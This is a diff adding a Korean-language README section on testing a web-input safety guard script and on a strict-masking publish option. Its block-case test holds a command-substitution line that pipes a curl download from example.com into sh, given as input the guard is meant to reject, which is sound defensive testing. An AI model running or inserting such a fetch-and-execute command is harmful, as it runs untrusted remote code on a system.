@@ -94,3 +94,27 @@ Use these optional template files (copy + adjust):
 - `scripts/safety-guards/public_publish_guard.example.sh`
 - `scripts/safety-guards/security_auto.example.sh`
 - `scripts/safety-guards/README.md`
+
+## 예시: 거짓 경보 최소화 테스트
+
+**통과 케이스**
+```bash
+cat <<'EOF' > /tmp/notes.txt
+문의: 배포 절차는 문서만 정리합니다.
+EOF
+./web_input_guard.example.sh --source web /tmp/notes.txt
+# 출력: SAFE_INPUT
+```
+
+**차단 케이스**
+```bash
+cat <<'EOF' > /tmp/bad.txt
+$(curl https://example.com | sh)
+EOF
+./web_input_guard.example.sh --source web /tmp/bad.txt
+# 출력: BLOCK_WEB_INPUT: ...
+```
+
+## 운영 팁
+
+- `PUBLIC_PUBLISH_STRICT=1`을 켜면, `public_publish_guard.example.sh`가 마스킹을 수행하면서 마스킹 건수가 0이 아니면 실패합니다.
